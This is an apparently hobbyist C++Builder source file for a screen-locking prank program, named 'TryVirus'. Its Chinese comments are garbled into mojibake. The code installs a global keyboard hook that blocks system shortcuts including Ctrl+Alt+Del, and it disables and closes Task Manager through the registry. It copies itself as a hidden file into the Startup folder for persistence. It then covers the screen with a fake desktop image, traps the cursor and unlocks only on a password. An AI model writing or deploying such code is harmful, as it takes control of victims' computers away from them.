//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "TryVirus.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TMyForm *MyForm;


 HHOOK   OldHook ;
 
//---------------------------------------------------------------------------
__fastcall TMyForm::TMyForm(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------
/*
�� ����̹��Ӵ������û��û����̺�ϵͳ����֮�䣬
����ͨ���̹����������ϵͳ����WM_KEYxxx֮�󡣺������
��ͨ���̹���ֻ�ܽػ�WM_KEYxxx��Ϣ�������ܶ�ϵͳ�����в�����
���ǵײ���̹�����һ�����������㣬��������������Ľ��̻��̳߳�����ѭ����
ϵͳ�����ܴ����κμ��̲�����Ϊ�˽��������⣬
΢����ע����и�����һ���ײ���̹��Ӵ��������ʱ�䣬������������ʱ�䣬
ϵͳ�������������ʱ��ļ�ֵ��ע����
HKEY_CURRENT_USER\Control Panel\Desktop\ LowLevelHooksTimeout�¸�����
HHOOK SetWindowsHookEx(  int iHookCode,HOOKPROC lpfn,
                    HINSTANCE hModule,DWORD dwThreadId);
  ���У���һ�������ǹ��ӵ����ͣ��ڶ��������ǹ��Ӻ����ĵ�ַ��
  �����������ǰ������Ӻ�����ģ���������ĸ�����ָ�����ӵ��̡߳�
  ���ָ��ȷ�����̣߳���Ϊ�߳�ר�ù��ӣ����ָ��Ϊ�գ���Ϊȫ�ֹ��ӡ�
  ���У�ȫ�ֹ��Ӻ������������DLL����̬���ӿ⣩�У�
  ���߳�ר�ù��ӻ����԰����ڿ�ִ���ļ��С��õ�����Ȩ�Ĺ��Ӻ�������ɶ���Ϣ�Ĵ����
  �����Ҫ����Ϣ�������ݣ���ô�������������һ��SDK�е�API����CallNextHookEx����������
  ���Ӻ���Ҳ����ͨ��ֱ�ӷ���TRUE����������Ϣ������ֹ����Ϣ�Ĵ��ݡ�
*/
void __fastcall TMyForm::WMKEYDOWN(TWMKey &Msg)
{
    if(Msg.KeyData==VK_LWIN || Msg.KeyData==VK_RWIN )
        Msg.Result = ' ' ;
    if(Msg.KeyData==13 )
        Msg.Result = 27 ;
}
//---------------------------------------------------------------------------
void __fastcall TMyForm::WMKEYUP(TWMKey &Msg)
{
    if(Msg.KeyData==VK_LWIN || Msg.KeyData==VK_RWIN )
        Msg.Result = ' ' ;
    if(Msg.KeyData==13 )
        Msg.Result = 27 ;
}
//---------------------------------------------------------------------------
void __fastcall TMyForm::MYHOTKEY(TWMHotKey &Msg)
{    //?????what why ////
    if( Msg.HotKey==VK_F4|VK_MENU)
    {    ///!!!!!//
        ShowMessage(" TWMHotKey -- Alt + F4 ")  ;
  //      Msg.HotKey =
        SetForegroundWindow(Handle);
    }
}
//---------------------------------------------------------------------------
LRESULT  CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
      bool fEatKeystroke = FALSE ;
      if (nCode == HC_ACTION)
      {
        switch (wParam)
        {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
            case WM_KEYUP:
            case WM_SYSKEYUP:
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
            fEatKeystroke =  ((p->vkCode == VK_TAB) && ((p->flags & LLKHF_ALTDOWN) != 0)) ||
                    ((p->vkCode == VK_ESCAPE) &&((p->flags & LLKHF_ALTDOWN) != 0)) ||
                    ((p->vkCode == VK_ESCAPE) && ((GetKeyState(VK_CONTROL) & 0x8000) != 0)) ;
            break ;
        }
      }
      return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam,lParam)) ;
}
//���̹��� ���� windows �ȼ�
LRESULT CALLBACK KeyProc(int code, WPARAM wParam, LPARAM lParam) //LRESULT --long
{
    KBDLLHOOKSTRUCT *pkbhs;
    if (code < 0)
    {
        return CallNextHookEx(OldHook,code, wParam, lParam);
    }
    pkbhs = (KBDLLHOOKSTRUCT*) lParam;
    if (pkbhs->vkCode==91)//����win��
    {
        return 1;
    }
    if (pkbhs->vkCode==VK_ESCAPE && GetAsyncKeyState(VK_CONTROL)<0)
    {
        return 1; //���� CTRL+ESC
    }
    if (pkbhs->vkCode==VK_TAB && pkbhs->flags&LLKHF_ALTDOWN)
    {
        return 1; //���� ALT+TAB
    }
    if (pkbhs->vkCode==VK_F4 && pkbhs->flags&LLKHF_ALTDOWN)//F4 --VK_F4 ,or Aciia 115
    {
        return 1; //���� ALT+F4
    }
    if (pkbhs->vkCode==VK_ESCAPE && pkbhs->flags&LLKHF_ALTDOWN)
    {
        return 1; //���� ALT+ESC
    }
    if (pkbhs->vkCode==VK_SPACE &&  GetAsyncKeyState(VK_CONTROL)<0)
    {
        return 1; //���� CTRL+ ' '
    }

    if (pkbhs->vkCode == VK_DELETE && pkbhs->flags&LLKHF_ALTDOWN && GetAsyncKeyState(VK_CONTROL) < 0)//&& pkbhs->vkCode == VK_DELETE<0)
    {
        return 1; //���� CTRL+ ALT +del
    }
    if (pkbhs->vkCode == VK_F12&& pkbhs->flags&LLKHF_ALTDOWN )//&& pkbhs->vkCode == VK_DELETE<0)
    {
        SendMessage(Application->Handle ,WM_CLOSE ,0 ,0) ; //���� CTRL+ ALT +F12 �˳�
        return 1;
    }
    return CallNextHookEx(OldHook,code, wParam, lParam);
}
//---------------------------------------------------------------------------
void    DisableTaskmgr(bool Key)
{
    TRegistry   *Reg = new TRegistry() ;
    Reg->RootKey = HKEY_CURRENT_USER ;
    if ( Reg->OpenKey("\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
    {
      if (Key)
        Reg->WriteString("DisableTaskMgr","1") ;
      else
        Reg->WriteInteger("DisableTaskMgr",0) ;
    }
    Reg->CloseKey();
    delete Reg ;
    SystemParametersInfo(SPI_SETDESKWALLPAPER ,0 ,NULL ,SPIF_SENDCHANGE) ;
}
//---------------------------------------------------------------------------
void __fastcall TMyForm::FormCreate(TObject *Sender)
{
/*    */
   // SystemParametersInfo(...) //win95/win98����ϵͳ�£�
         //ͨ����ϵͳ������Ļ��������������ϵͳ�ȼ�
    OldHook = SetWindowsHookEx( WH_KEYBOARD_LL, (HOOKPROC)KeyProc, HInstance, 0);
    int temp;
    SystemParametersInfo(SPI_SCREENSAVERRUNNING,1,&temp,0);    /*
    //�ָ�ϵͳ�ȼ�
    int temp;
    SystemParametersInfo(SPI_SCREENSAVERRUNNING,0,&temp,0);
     //��װ�ײ���̹���
    HHOOK hhkLowLevelKybd = ::SetWindowsHookEx(WH_KEYBOARD_LL,
                                (HOOKPROC)LowLevelKeyboardProc, HInstance, 0 ) ;// LowLevelKeyboardProc
   MessageBox( NULL, TEXT("Alt+Esc, Ctrl+Esc, and Alt+Tab are now disabled.\n")
                TEXT("Click \"Ok\" to terminate this application and re-enable these keys."),
                TEXT("Disable Low-Level Keys"), MB_OK);     
    UnhookWindowsHookEx(hhkLowLevelKybd);    */
    //ʹӦ�ó��򲻳�����������
    SetWindowLong(Application->Handle,GWL_EXSTYLE,WS_EX_TOOLWINDOW);
    this->WindowState = wsMaximized ;
    this->BorderStyle = bsNone ;
    this->FormStyle = fsStayOnTop ;
    ImageScreen->Align = alClient ;
    //�ر� ���������
    HWND    taskmgrHandle = FindWindow(NULL ,"Windows ���������") ;
    SendMessage(taskmgrHandle ,WM_CLOSE ,0 ,0) ;
    DisableTaskmgr(true) ; //true,���Ρ������������
 //�����ļ���ϵͳ����������
//    ShowMessage(Application->ExeName) ;
    String  filepath  = "C:\\Documents and Settings\\Administrator\\����ʼ���˵�\\����\\����\\"
                        + Application->Title+".exe" ;
//   1111111
    if(CopyFile(Application->ExeName.c_str() ,filepath.c_str() ,false))// Application->ExeName
        ;//ShowMessage("OK !") ;
    else
        ;//ShowMessage("Error !") ;
    FileSetAttr(filepath ,2 ) ; //�����ļ�
    /*
extern PACKAGE int __fastcall FileSetAttr(const AnsiString FileName, int Attr);
faReadOnly	0x01	Read-only files
faHidden	0x02	Hidden files
faSysFile	0x04	System files
faVolumeID	0x08	Volume ID files
faDirectory	0x010	Directory files
faArchive	0x020	Archive files
faAnyFile	0x03F	Any file
    */
    /*  222222222222
    if(CopyFileTo(Application->ExeName ,filepath+"\\" +Application->Title+".exe"))
        ShowMessage("OK !") ;
    else
        ShowMessage("Error !") ;   */
    //LabeledEdit1->e ;
}
//---------------------------------------------------------------------------

void     TMyForm::CaptureDesktop(HDC ImageHandle )
{
    HDC hdc = GetDC(0) ;
    BitBlt(ImageHandle ,0 ,0 ,Screen->Width ,
            Screen->Height ,hdc ,0 ,0 ,SRCCOPY ) ;
    ReleaseDC(0 ,hdc) ;
}
//---------------------------------------------------------------------------

void __fastcall TMyForm::Timer1Timer(TObject *Sender)
{
    static int  timecount = 0 ;
    timecount++ ;
    if( timecount==3 )
    {
        this->Visible = false ;
        ImageHello->Visible = false ;
    }
    else if( timecount==6 )
    {
        ImageScreen->Canvas->FillRect(ImageScreen->Canvas->ClipRect) ;
        Sleep(1000) ;
        CaptureDesktop(ImageScreen->Canvas->Handle) ;
        this->Visible = true ;
        timecount = 0 ;
        Timer1->Enabled = false ;
        Timer2->Enabled = true ;
    }

}
//---------------------------------------------------------------------------

void __fastcall TMyForm::ImageScreenMouseDown(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
        TRect MyArea = TRect(100 ,100 ,120 ,120) ;//������ꡢ����
        MapWindowPoints(Handle,0,(LPPOINT)(&MyArea),2);
        ClipCursor(&MyArea);
}
//---------------------------------------------------------------------------

void __fastcall TMyForm::FormKeyDown(TObject *Sender, WORD &Key,
      TShiftState Shift)
{
    if(Key==27)
        Close() ;
    if( Key==VK_LWIN || Key==VK_RWIN )
        ImageHello->Visible = true ;
}
//---------------------------------------------------------------------------

void __fastcall TMyForm::FormDestroy(TObject *Sender)
{
    DisableTaskmgr(false) ; //ΪFalse,�����������������
}
//---------------------------------------------------------------------------

void __fastcall TMyForm::LabeledEdit1KeyPress(TObject *Sender, char &Key)
{
    if(Key==13)
    {
        if(LabeledEdit1->Text=="����ɵB") //LabeledEdit1
            Close() ;
        else
           LabeledEdit1->Text = "" ;
    }
}
//---------------------------------------------------------------------------


void __fastcall TMyForm::Timer2Timer(TObject *Sender)
{
    static bool  changeimage = false ;
    if(changeimage)
    {
        ImageHello->Visible = false ;
        ImageScreen->Visible = true ;
        LabeledEdit1->Visible = false ;
        changeimage = false ;
    }
    else
    {
        ImageHello->Visible = true ;
        ImageScreen->Visible = false ;
        LabeledEdit1->Visible = true ;
        LabeledEdit1->SetFocus() ;
        changeimage = true ;
    }

}
//---------------------------------------------------------------------------

